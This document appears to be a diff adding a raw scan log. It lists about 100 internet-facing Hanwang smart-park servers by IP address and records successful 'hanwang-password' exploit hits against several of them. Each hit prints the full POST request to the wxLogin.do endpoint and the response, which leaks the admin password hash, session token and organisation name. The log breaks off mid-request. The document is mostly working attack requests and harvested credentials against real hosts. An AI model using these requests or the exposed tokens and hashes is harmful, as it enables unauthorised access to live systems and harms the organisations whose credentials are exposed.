@@ -1,0 +1,491 @@
+[+] 本次搜索关键字为：icon_hash=1380907357
+https://39.101.136.238:8094    汉王智慧园区               中国, Beijing
+http://222.134.206.214:10000   汉王智慧园区               中国, Jinan
+http://222.134.206.214:9999    HTTP                       中国, Jinan
+http://39.96.27.192:8554       汉王智慧园区               中国, Beijing
+https://47.109.107.99          HTTPS                      中国, Chengdu
+http://180.184.172.105:5800    HTTP                       中国, Beijing
+http://223.223.177.153:7100    HTTP                       中国, Beijing
+http://8.220.132.100           HTTP                       菲律宾, Manila
+https://182.92.162.37          HTTPS                      中国, Beijing
+http://223.223.177.153:7500    汉王智慧园区               中国, Beijing
+http://47.101.173.96:8300      汉王智慧园区               中国, Shanghai
+http://47.101.173.96:8100      HTTP                       中国, Shanghai
+https://61.190.213.148:7000    HTTPS                      中国, Xuancheng
+https://36.33.168.218:7000     HTTPS                      中国, Ma'anshan
+http://61.167.247.150:9002     HTTP                       中国, Harbin
+http://183.245.32.111:8800     HTTP                       中国, Wenzhou
+http://61.167.247.150:9003     HTTP                       中国, Harbin
+http://119.3.161.135:8100      HTTP                       中国, Beijing
+http://113.230.75.34:8200      HTTP                       中国, Panjin
+https://www.cqhanwang.com      HTTPS                      中国, Chengdu
+https://cqhanwang.com          HTTPS                      中国, Chengdu
+http://47.95.216.216:9000      HTTP                       中国, Beijing
+http://121.18.229.66:9876      HTTP                       中国, Baoding
+https://218.8.130.30:8086      齐车公司智慧园区           中国, Qiqihar
+https://111.15.186.217:8093    齐车公司智慧园区           中国, Weifang
+https://dog.hwzy99.com         HTTPS                      中国, Beijing
+http://183.6.101.19:7100       HTTP                       中国, Guangzhou
+http://14.103.20.50:5800       HTTP                       中国, Beijing
+http://116.198.46.169:49154    HTTP                       中国, Beijing
+http://8.155.30.208:4440       汉王智慧园区               中国, Hangzhou
+http://129.226.89.158:10443    HTTP                       新加坡, Singapore
+http://43.130.249.241:1981     HTTP                       日本, Tokyo
+http://47.120.13.42:6590       汉王智慧园区               中国, Shenzhen
+http://47.121.211.168:32770    汉王智慧园区               中国, Hangzhou
+http://66.112.217.234:18000    HTTP                       美国, Los Angeles
+http://150.109.22.209:6000     HTTP                       新加坡, Singapore
+http://43.134.107.84:6080      HTTP                       新加坡, Singapore
+http://115.190.111.105:8880    HTTP                       中国, Beijing
+http://124.70.70.58:8100       HTTP                       中国, Guangzhou
+http://125.34.52.183:7100      HTTP                       中国, Beijing
+http://47.95.216.216:9004      HTTP                       中国, Hangzhou
+http://pysdbzx.com:8100        HTTP                       中国, Pingdingshan
+http://www.pysdbzx.com:8100    HTTP                       中国, Pingdingshan
+http://66.112.217.234:8004     HTTP                       美国, Los Angeles
+https://203.176.93.230         高血压管理平台             中国, Guangzhou
+https://qczhfk.qrrs.com.cn:8086 汉王智慧园区               中国, Qiqihar
+http://113.0.125.13:8100       HTTP                       中国, Harbin
+http://60.2.211.133:8100       HTTP                       中国, Tangshan
+https://113.98.61.179:8100     HTTPS                      中国, Guangzhou
+http://1.85.40.164:8100        HTTP                       中国, Xi'an
+http://101.35.36.10:8100       HTTP                       中国, Beijing
+https://qczhkq.qrrs.com.cn:8093 汉王智慧园区               中国, Weifang
+http://123.233.113.50:8100     HTTP                       中国, Jinan
+http://60.28.53.122:8100       HTTP                       中国, Tianjin
+http://49.233.49.100:8100      HTTP                       中国, Beijing
+http://47.100.165.225:8100     HTTP                       中国, Shanghai
+http://39.171.53.4:10006       汉王智慧园区               中国, Wenzhou
+http://223.223.177.153:7400    HTTP                       中国, Beijing
+http://60.171.94.102:8100      HTTP                       中国, Ma'anshan
+http://49.7.175.236:8100       HTTP                       中国, Beijing
+http://112.6.137.47:8100       HTTP                       中国, Qingdao
+http://221.214.12.253:8100     HTTP                       中国, Jinan
+http://218.10.232.25:8100      HTTP                       中国, Harbin
+http://47.120.74.253:8100      HTTP                       中国, Shenzhen
+http://114.116.235.40:8100     HTTP                       中国, Beijing
+http://122.228.124.22:8100     HTTP                       中国, Wenzhou
+http://111.56.37.46:8100       HTTP                       中国, Baotou
+http://221.216.205.98:8100     HTTP                       中国, Beijing
+http://111.198.19.25:8100      HTTP                       中国, Beijing
+http://36.7.81.201:8100        HTTP                       中国, Hefei
+http://36.41.75.233:8100       HTTP                       中国, Xianyang
+http://47.106.126.42:8100      HTTP                       中国, Shenzhen
+http://221.203.30.76:8100      HTTP                       中国, Anshan
+http://1.94.1.71:8100          HTTP                       中国, Beijing
+http://182.42.120.250:8100     HTTP                       中国, Jinan
+http://219.138.228.29:8100     HTTP                       中国, Ezhou
+http://119.36.235.225:8100     HTTP                       中国, Wuhan
+http://39.96.174.19:8100       HTTP                       中国, Beijing
+http://139.9.38.216:8100       HTTP                       中国, Guangzhou
+http://8.134.142.101:8100      HTTP                       中国, Guangzhou
+http://120.33.122.174:8100     HTTP                       中国, Quanzhou
+http://106.13.57.4:8100        HTTP                       中国, Beijing
+http://115.190.111.105:49165   汉王智慧园区               中国, Beijing
+http://122.224.144.150:8100    HTTP                       中国, Hangzhou
+http://220.250.58.102:8100     HTTP                       中国, Fuzhou
+http://101.251.238.37:8100     HTTP                       中国, Beijing
+http://182.92.162.37:8100      HTTP                       中国, Beijing
+http://39.171.53.4:10008       HTTP                       中国, Wenzhou
+https://bpm.hanvon.com         高血压管理平台             中国, Wenzhou
+http://221.216.204.146:8100    HTTP                       中国, Beijing
+http://103.131.154.83:8100     HTTP                       中国, Beijing
+http://59.57.99.46:8100        HTTP                       中国, Quanzhou
+http://106.116.24.169:18100    HTTP                       中国, Tangshan
+http://113.105.181.126:8100    HTTP                       中国, Dongguan
+http://109.244.77.12:8100      HTTP                       中国, Beijing
+http://59.44.191.58:8100       HTTP                       中国, Chaoyang
+http://114.251.30.148:8100     HTTP                       中国, Beijing
+http://47.120.3.188:8100       HTTP                       中国, Shenzhen
+http://114.251.88.100:8100     HTTP                       中国, Beijing
+http://123.188.254.215:8399    汉王智慧园区               中国, Chaoyang
+[+] 本次搜索，返回结果总条数为：329,此次返回条数为：100
+http://222.134.206.214:10000             🤓 汗王智慧园区;JeecgBoot
+http://222.134.206.214:9999              🤓 汗王智慧园区
+http://39.96.27.192:8554                 🤓 汗王智慧园区;JeecgBoot
+https://39.101.136.238:8094              🤓 汗王智慧园区;JeecgBoot
+http://180.184.172.105:5800              🤓 汗王智慧园区
+https://47.109.107.99                    🤓 汗王智慧园区
+http://223.223.177.153:7100              🤓 汗王智慧园区
+https://182.92.162.37                    🤓 汗王智慧园区
+http://8.220.132.100                     🤓 汗王智慧园区
+http://223.223.177.153:7500              🤓 汗王智慧园区;JeecgBoot
+http://47.101.173.96:8300                🤓 汗王智慧园区;JeecgBoot
+http://47.101.173.96:8100                🤓 汗王智慧园区
+https://61.190.213.148:7000              🤓 汗王智慧园区
+https://36.33.168.218:7000               🤓 汗王智慧园区
+http://61.167.247.150:9002               🤓 汗王智慧园区
+http://61.167.247.150:9003               🤓 汗王智慧园区
+http://119.3.161.135:8100                🤓 汗王智慧园区
+http://113.230.75.34:8200                🤓 汗王智慧园区
+https://www.cqhanwang.com                🤓 汗王智慧园区
+http://121.18.229.66:9876                🤓 汗王智慧园区
+https://cqhanwang.com                    🤓 汗王智慧园区
+https://111.15.186.217:8093              🤓 汗王智慧园区;JeecgBoot
+http://183.6.101.19:7100                 🤓 汗王智慧园区
+https://dog.hwzy99.com                   🤓 汗王智慧园区
+http://14.103.20.50:5800                 🤓 汗王智慧园区
+http://116.198.46.169:49154              🤓 汗王智慧园区
+http://8.155.30.208:4440                 🤓 汗王智慧园区;JeecgBoot
+http://47.120.13.42:6590                 🤓 汗王智慧园区;JeecgBoot
+http://47.121.211.168:32770              🤓 汗王智慧园区;JeecgBoot
+http://43.130.249.241:1981               🤓 汗王智慧园区
+http://124.70.70.58:8100                 🤓 汗王智慧园区
+http://www.pysdbzx.com:8100              🤓 汗王智慧园区
+http://113.0.125.13:8100                 🤓 汗王智慧园区
+http://60.2.211.133:8100                 🤓 汗王智慧园区
+https://113.98.61.179:8100               🤓 汗王智慧园区
+http://101.35.36.10:8100                 🤓 汗王智慧园区
+http://pysdbzx.com:8100                  🤓 汗王智慧园区
+https://qczhkq.qrrs.com.cn:8093          🤓 汗王智慧园区;JeecgBoot
+http://43.134.107.84:6080                🤓 汗王智慧园区
+http://39.171.53.4:10006                 🤓 汗王智慧园区;JeecgBoot
+http://60.28.53.122:8100                 🤓 汗王智慧园区
+http://49.7.175.236:8100                 🤓 汗王智慧园区
+http://112.6.137.47:8100                 🤓 汗王智慧园区
+http://150.109.22.209:6000               🤓 汗王智慧园区
+http://223.223.177.153:7400              🤓 汗王智慧园区
+http://47.100.165.225:8100               🤓 汗王智慧园区
+http://221.214.12.253:8100               🤓 汗王智慧园区
+http://122.228.124.22:8100               🤓 汗王智慧园区
+http://47.120.74.253:8100                🤓 汗王智慧园区
+http://114.116.235.40:8100               🤓 汗王智慧园区
+http://218.10.232.25:8100                🤓 汗王智慧园区
+http://111.198.19.25:8100                🤓 汗王智慧园区
+http://111.56.37.46:8100                 🤓 汗王智慧园区
+http://47.106.126.42:8100                🤓 汗王智慧园区
+http://36.7.81.201:8100                  🤓 汗王智慧园区
+http://36.41.75.233:8100                 🤓 汗王智慧园区
+http://182.42.120.250:8100               🤓 汗王智慧园区
+http://221.203.30.76:8100                🤓 汗王智慧园区
+http://119.36.235.225:8100               🤓 汗王智慧园区
+http://39.96.174.19:8100                 🤓 汗王智慧园区
+http://1.94.1.71:8100                    🤓 汗王智慧园区
+http://120.33.122.174:8100               🤓 汗王智慧园区
+http://106.13.57.4:8100                  🤓 汗王智慧园区
+http://122.224.144.150:8100              🤓 汗王智慧园区
+http://101.251.238.37:8100               🤓 汗王智慧园区
+[vuln] [high] [hanwang-password] https://111.15.186.217:8093/manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1
+================  请求数据包 ================
+POST /manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1 HTTP/1.1
+Host: 111.15.186.217:8093
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0
+Connection: close
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+
+================  请求响应包 ================
+HTTP/1.1 200 
+Connection: close
+Transfer-Encoding: chunked
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Methods: GET, POST, OPTIONS
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Origin: *
+Content-Type: text/html;charset=UTF-8
+Date: Thu, 26 Mar 2026 07:32:52 GMT
+Server: nginx
+Set-Cookie: JSESSIONID=9AF4626042A45CA1ACC8227F375B3853; Path=/; HttpOnly
+Vary: Accept-Encoding
+Vary: accept-encoding
+
+{"code":0,"result":{"recordTcpPort":9910,"id":1,"userName":"admin","employId":"admin","name":"超级管理员","email":"admin@hanwang.com.cn","password":"4b080fc2a32ff6f5ae06bb61554efcac209439e7","gender":1,"telephone":"","mobile":"","state":9,"entryDate":"2012-01-01 00:00:00","startWorkDate":"2012-01-01 00:00:00","judgeId":0,"leader":false,"approver":false,"userBranch":{"id":1,"userId":1,"userName":"admin","branchId":1,"branchName":"中车齐齐哈尔","branchSetId":"CRRC","branchCode":"CRRC","postId":1,"postName":"普通员工","syncSign":0,"primary":true,"postType":"","order":0,"branchLevel":9,"leader":false},"cameraFeatureCount":0,"littleFaceCount":0,"workFactor":0,"hasLevelAuthority":false,"branchId":1,"branchName":"中车齐齐哈尔","branchPath":",2,1,","postId":1,"postName":"普通员工","willSync":false,"mobiAttPerm":0,"mobiState":-1,"checkMsg":1,"checkPerm":1,"workonMsg":1,"workonPerm":1,"workendMsg":1,"workendPerm":1,"token":"4E3746E091C1548F013E7FF6555F9F0B9E4E3262","type":1,"changPic":0,"carNumberFlag":false,"updatePersonnelFlag":false,"palmPrintFeatureCount":0,"fingerFeatureCount":0,"districtIds":[],"holidaySearch":true,"openid":"1","blacklist":false},"success":true}
+============================================
+http://39.171.53.4:10008                 🤓 汗王智慧园区
+[vuln] [high] [hanwang-password] http://8.220.132.100/manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1
+================  请求数据包 ================
+POST /manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1 HTTP/1.1
+Host: 8.220.132.100
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
+Connection: close
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+
+================  请求响应包 ================
+HTTP/1.1 200 
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html;charset=UTF-8
+Date: Thu, 26 Mar 2026 07:32:51 GMT
+Server: nginx/1.12.2
+Set-Cookie: JSESSIONID=30B68C6C07330F3FB3C64DDA14A49D13; Path=/; HttpOnly
+Vary: accept-encoding
+
+{"code":0,"result":{"recordTcpPort":9910,"id":1,"userName":"admin","employId":"admin","name":"Super Admin","email":"admin@hanwang.com.cn","password":"c6f83b24b2bb3f7648fb92dc340307d71065715d","gender":1,"telephone":"","mobile":"","state":9,"entryDate":"2012-01-01 00:00:00","startWorkDate":"2012-01-01 00:00:00","judgeId":0,"leader":false,"approver":false,"userBranch":{"id":1,"userId":1,"userName":"admin","branchId":1,"branchName":"PH JET","branchSetId":"000","branchCode":"000","postId":1,"postName":"Generalist Admin","syncSign":0,"primary":true,"postType":"","order":0,"branchLevel":9,"leader":false},"cameraFeatureCount":0,"littleFaceCount":0,"workFactor":0,"hasLevelAuthority":false,"branchId":1,"branchName":"PH JET","postId":1,"postName":"Generalist Admin","willSync":false,"mobiAttPerm":0,"mobiState":-1,"checkMsg":1,"checkPerm":1,"workonMsg":1,"workonPerm":1,"workendMsg":1,"workendPerm":1,"token":"0217392FA0765AEA71B60DAF897E8582CA6AECBA","type":1,"fingerFeatureCount":0,"openid":"1","blacklist":false},"success":true}
+============================================
+http://220.250.58.102:8100               🤓 汗王智慧园区
+http://182.92.162.37:8100                🤓 汗王智慧园区
+http://221.216.204.146:8100              🤓 汗王智慧园区
+https://bpm.hanvon.com                   🤓 汗王智慧园区;OpenResty
+http://59.57.99.46:8100                  🤓 汗王智慧园区
+http://106.116.24.169:18100              🤓 汗王智慧园区
+http://109.244.77.12:8100                🤓 汗王智慧园区
+http://113.105.181.126:8100              🤓 汗王智慧园区
+http://59.44.191.58:8100                 🤓 汗王智慧园区
+http://114.251.88.100:8100               🤓 汗王智慧园区
+http://114.251.30.148:8100               🤓 汗王智慧园区
+http://47.120.3.188:8100                 🤓 汗王智慧园区
+http://123.188.254.215:8399              🤓 汗王智慧园区;JeecgBoot
+[vuln] [high] [hanwang-password] http://113.0.125.13:8100/manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1
+================  请求数据包 ================
+POST /manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1 HTTP/1.1
+Host: 113.0.125.13:8100
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_6; de) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.2 Safari/605.1.15
+Connection: close
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+
+================  请求响应包 ================
+HTTP/1.1 200 
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html;charset=UTF-8
+Date: Thu, 26 Mar 2026 07:35:39 GMT
+Server: nginx/1.21.0
+Set-Cookie: JSESSIONID=4ADDA170C55B02E66E90BA5276B6D145; Path=/; HttpOnly
+Vary: accept-encoding
+
+{"code":0,"result":{"recordTcpPort":9910,"id":1,"userName":"admin","employId":"admin","name":"超级管理员","email":"admin@hanwang.com.cn","password":"538282efc95782c5131ad4b19801f5fb47382085","gender":1,"telephone":"","mobile":"","state":9,"entryDate":"2012-01-01 00:00:00","startWorkDate":"2012-01-01 00:00:00","judgeId":0,"leader":false,"approver":false,"userBranch":{"id":1,"userId":1,"userName":"admin","branchId":1,"branchName":"鹤立林业局有限公司","branchSetId":"000","branchCode":"000","postId":1,"postName":"普通员工","syncSign":0,"primary":true,"postType":"","order":0,"branchLevel":9,"leader":false},"cameraFeatureCount":0,"littleFaceCount":0,"workFactor":0,"hasLevelAuthority":false,"branchId":1,"branchName":"鹤立林业局有限公司","branchPath":",2,1,","postId":1,"postName":"普通员工","willSync":false,"mobiAttPerm":0,"mobiState":-1,"checkMsg":1,"checkPerm":1,"workonMsg":1,"workonPerm":1,"workendMsg":1,"workendPerm":1,"token":"162BDDFEF87B8013582373C3C8D1F074523D97CA","type":1,"changPic":0,"carNumberFlag":false,"updatePersonnelFlag":false,"palmPrintFeatureCount":0,"fingerFeatureCount":0,"districtIds":[],"holidaySearch":true,"openid":"1","blacklist":false},"success":true}
+============================================
+[vuln] [high] [hanwang-password] http://49.7.175.236:8100/manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1
+================  请求数据包 ================
+POST /manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1 HTTP/1.1
+Host: 49.7.175.236:8100
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10
+Connection: close
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+
+================  请求响应包 ================
+HTTP/1.1 200 
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html;charset=UTF-8
+Date: Thu, 26 Mar 2026 07:33:01 GMT
+Server: nginx/1.21.0
+Set-Cookie: session_jamou1=8C93BB7F48CD00B2912C8B39EE251CB6; Path=/; HttpOnly
+Vary: accept-encoding
+
+{"code":0,"result":{"recordTcpPort":9910,"id":1,"userName":"admin","employId":"admin","name":"超级管理员","email":"admin@hanwang.com.cn","password":"b221fa8d46f7167c877e58c9fa1c64a0fa0c1369","gender":1,"telephone":"","mobile":"","state":9,"entryDate":"2012-01-01 00:00:00","startWorkDate":"2012-01-01 00:00:00","judgeId":0,"leader":false,"approver":false,"userBranch":{"id":1,"userId":1,"userName":"admin","branchId":1,"branchName":"中车叶片蒙西分公司","branchSetId":"000","branchCode":"000","postId":1,"postName":"普通员工","syncSign":0,"primary":true,"postType":"","order":0,"branchLevel":9,"leader":false},"cameraFeatureCount":0,"littleFaceCount":0,"workFactor":0,"hasLevelAuthority":false,"branchId":1,"branchName":"中车叶片蒙西分公司","postId":1,"postName":"普通员工","willSync":false,"mobiAttPerm":0,"mobiState":-1,"checkMsg":1,"checkPerm":1,"workonMsg":1,"workonPerm":1,"workendMsg":1,"workendPerm":1,"token":"491E5AFE59ADD57E90D92C45B4C2222B750D1EB1","type":1,"changPic":0,"openid":"1","blacklist":false},"success":true}
+============================================
+[vuln] [high] [hanwang-password] https://qczhkq.qrrs.com.cn:8093/manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1
+================  请求数据包 ================
+POST /manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1 HTTP/1.1
+Host: qczhkq.qrrs.com.cn:8093
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/15.5 Safari/537.36
+Connection: close
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+
+================  请求响应包 ================
+HTTP/1.1 200 
+Connection: close
+Transfer-Encoding: chunked
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Methods: GET, POST, OPTIONS
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Origin: *
+Content-Type: text/html;charset=UTF-8
+Date: Thu, 26 Mar 2026 07:33:10 GMT
+Server: nginx
+Set-Cookie: JSESSIONID=201BA6895CBE0E6FBB760C469F57CAC2; Path=/; HttpOnly
+Vary: Accept-Encoding
+Vary: accept-encoding
+
+{"code":0,"result":{"recordTcpPort":9910,"id":1,"userName":"admin","employId":"admin","name":"超级管理员","email":"admin@hanwang.com.cn","password":"4b080fc2a32ff6f5ae06bb61554efcac209439e7","gender":1,"telephone":"","mobile":"","state":9,"entryDate":"2012-01-01 00:00:00","startWorkDate":"2012-01-01 00:00:00","judgeId":0,"leader":false,"approver":false,"userBranch":{"id":1,"userId":1,"userName":"admin","branchId":1,"branchName":"中车齐齐哈尔","branchSetId":"CRRC","branchCode":"CRRC","postId":1,"postName":"普通员工","syncSign":0,"primary":true,"postType":"","order":0,"branchLevel":9,"leader":false},"cameraFeatureCount":0,"littleFaceCount":0,"workFactor":0,"hasLevelAuthority":false,"branchId":1,"branchName":"中车齐齐哈尔","branchPath":",2,1,","postId":1,"postName":"普通员工","willSync":false,"mobiAttPerm":0,"mobiState":-1,"checkMsg":1,"checkPerm":1,"workonMsg":1,"workonPerm":1,"workendMsg":1,"workendPerm":1,"token":"E931E26A3AE468CBA9BC081B4E95A85F0EF57E64","type":1,"changPic":0,"carNumberFlag":false,"updatePersonnelFlag":false,"palmPrintFeatureCount":0,"fingerFeatureCount":0,"districtIds":[],"holidaySearch":true,"openid":"1","blacklist":false},"success":true}
+============================================
+[vuln] [high] [hanwang-password] http://36.41.75.233:8100/manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1
+================  请求数据包 ================
+POST /manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1 HTTP/1.1
+Host: 36.41.75.233:8100
+User-Agent: Mozilla/5.0 (Windows NT 6.2; rv:139.0) Gecko/20100101 Firefox/139.0
+Connection: close
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+
+================  请求响应包 ================
+HTTP/1.1 200 
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html;charset=UTF-8
+Date: Thu, 26 Mar 2026 07:33:14 GMT
+Server: nginx/1.21.0
+Set-Cookie: JSESSIONID=C8DEBE9FB00C0F05EB4225F0BB0177A0; Path=/; HttpOnly
+Vary: accept-encoding
+
+{"code":0,"result":{"recordTcpPort":9910,"id":1,"userName":"admin","employId":"admin","name":"超级管理员","email":"admin@hanwang.com.cn","password":"c2106dc9520c4edf378fd09732d2f87a1940062b","gender":1,"telephone":"","mobile":"","state":9,"entryDate":"2012-01-01 00:00:00","startWorkDate":"2012-01-01 00:00:00","judgeId":0,"leader":false,"approver":false,"userBranch":{"id":1,"userId":1,"userName":"admin","branchId":1,"branchName":"园区","branchSetId":"000","branchCode":"000","postId":1,"postName":"普通员工","syncSign":0,"primary":true,"postType":"","order":0,"branchLevel":9,"leader":false},"cameraFeatureCount":0,"littleFaceCount":0,"workFactor":0,"hasLevelAuthority":false,"branchId":1,"branchName":"园区","branchPath":",2,1,","postId":1,"postName":"普通员工","willSync":false,"mobiAttPerm":0,"mobiState":-1,"checkMsg":1,"checkPerm":1,"workonMsg":1,"workonPerm":1,"workendMsg":1,"workendPerm":1,"token":"56774A312DAA728E06C12AD6871A3295A1D134CE","type":1,"changPic":0,"carNumberFlag":false,"updatePersonnelFlag":false,"palmPrintFeatureCount":0,"fingerFeatureCount":0,"districtIds":[],"holidaySearch":true,"openid":"1","blacklist":false},"success":true}
+============================================
+[vuln] [high] [hanwang-password] http://182.42.120.250:8100/manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1
+================  请求数据包 ================
+POST /manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1 HTTP/1.1
+Host: 182.42.120.250:8100
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.2 Safari/605.1.15
+Connection: close
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+
+================  请求响应包 ================
+HTTP/1.1 200 
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html;charset=UTF-8
+Date: Thu, 26 Mar 2026 07:34:06 GMT
+Server: nginx/1.21.0
+Set-Cookie: session_jamou1=E70245686A632EB23BE092E2B9944056; Path=/; HttpOnly
+Vary: accept-encoding
+
+{"code":0,"result":{"recordTcpPort":9910,"id":1,"userName":"admin","employId":"admin","name":"超级管理员","email":"admin@hanwang.com.cn","password":"b221fa8d46f7167c877e58c9fa1c64a0fa0c1369","gender":1,"telephone":"","mobile":"","state":9,"entryDate":"2012-01-01 00:00:00","startWorkDate":"2012-01-01 00:00:00","judgeId":0,"leader":false,"approver":false,"userBranch":{"id":1,"userId":1,"userName":"admin","branchId":1,"branchName":"宾县工厂","branchSetId":"BX","branchCode":"BX","postId":1,"postName":"普通员工","syncSign":0,"primary":true,"postType":"","order":0,"branchLevel":9,"leader":false},"cameraFeatureCount":0,"littleFaceCount":0,"workFactor":0,"hasLevelAuthority":false,"branchId":1,"branchName":"宾县工厂","postId":1,"postName":"普通员工","willSync":false,"mobiAttPerm":0,"mobiState":-1,"checkMsg":1,"checkPerm":1,"workonMsg":1,"workonPerm":1,"workendMsg":1,"workendPerm":1,"token":"D03CF7122C48121BC237B4B5434ABB2065057DF9","type":1,"changPic":0,"openid":"1","blacklist":false},"success":true}
+============================================
+[vuln] [high] [hanwang-password] http://39.96.174.19:8100/manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1
+================  请求数据包 ================
+POST /manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1 HTTP/1.1
+Host: 39.96.174.19:8100
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
+Connection: close
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+
+================  请求响应包 ================
+HTTP/1.1 200 
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html;charset=UTF-8
+Date: Thu, 26 Mar 2026 07:33:18 GMT
+Server: nginx/1.21.0
+Set-Cookie: JSESSIONID=7FF7DE76E98B0D4A7F5B9078039FA4FA; Path=/; HttpOnly
+Vary: accept-encoding
+
+{"code":0,"result":{"recordTcpPort":9910,"id":1,"userName":"admin","employId":"admin","name":"超级管理员","email":"admin@hanwang.com.cn","password":"c2106dc9520c4edf378fd09732d2f87a1940062b","gender":1,"telephone":"","mobile":"","state":9,"entryDate":"2012-01-01 00:00:00","startWorkDate":"2012-01-01 00:00:00","judgeId":0,"leader":false,"approver":false,"userBranch":{"id":1,"userId":1,"userName":"admin","branchId":1,"branchName":"总公司","branchSetId":"0","branchCode":"0","postId":1,"postName":"普通员工","syncSign":0,"primary":true,"postType":"","order":0,"branchLevel":9,"leader":false},"cameraFeatureCount":0,"littleFaceCount":0,"workFactor":0,"hasLevelAuthority":false,"branchId":1,"branchName":"总公司","postId":1,"postName":"普通员工","willSync":false,"mobiAttPerm":0,"mobiState":-1,"checkMsg":1,"checkPerm":1,"workonMsg":1,"workonPerm":1,"workendMsg":1,"workendPerm":1,"token":"948F1CD7D6F5A967515587101AA7033CF1531D3B","type":1,"effectiveDate":"2050-01-01 00:00:00","changPic":0,"carNumberFlag":false,"updatePersonnelFlag":false,"palmPrintFeatureCount":0,"openid":"1","blacklist":false},"success":true}
+============================================
+[vuln] [high] [hanwang-password] http://47.120.74.253:8100/manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1
+================  请求数据包 ================
+POST /manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1 HTTP/1.1
+Host: 47.120.74.253:8100
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/ Firefox/12.0
+Connection: close
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+
+================  请求响应包 ================
+HTTP/1.1 200 
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html;charset=UTF-8
+Date: Thu, 26 Mar 2026 07:33:19 GMT
+Server: nginx/1.21.0
+Set-Cookie: JSESSIONID=0429C389C454744497602DFD4F701257; Path=/; HttpOnly
+Vary: accept-encoding
+
+{"code":0,"result":{"recordTcpPort":9910,"id":1,"userName":"admin","employId":"admin","name":"超级管理员","email":"admin@hanwang.com.cn","password":"d7ef5266cbba137250b0b2aca919b1e3a939117d","gender":1,"telephone":"","mobile":"","state":9,"entryDate":"2012-01-01 00:00:00","startWorkDate":"2012-01-01 00:00:00","judgeId":0,"leader":false,"approver":false,"userBranch":{"id":1,"userId":1,"userName":"admin","branchId":1,"branchName":"部门","branchSetId":"000","branchCode":"000","postId":1,"postName":"普通员工","syncSign":0,"primary":true,"postType":"","order":0,"branchLevel":9,"leader":false},"cameraFeatureCount":0,"littleFaceCount":0,"workFactor":0,"hasLevelAuthority":false,"branchId":1,"branchName":"部门","branchPath":",2,1,","postId":1,"postName":"普通员工","willSync":false,"mobiAttPerm":0,"mobiState":-1,"checkMsg":1,"checkPerm":1,"workonMsg":1,"workonPerm":1,"workendMsg":1,"workendPerm":1,"token":"A6C18975DEB37CDEEBD296C00665F284536925B9","type":1,"changPic":0,"carNumberFlag":false,"updatePersonnelFlag":false,"palmPrintFeatureCount":0,"fingerFeatureCount":0,"districtIds":[],"holidaySearch":true,"openid":"1","blacklist":false},"success":true}
+============================================
+[vuln] [high] [hanwang-password] http://1.94.1.71:8100/manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1
+================  请求数据包 ================
+POST /manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1 HTTP/1.1
+Host: 1.94.1.71:8100
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Safari/605.1.15
+Connection: close
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
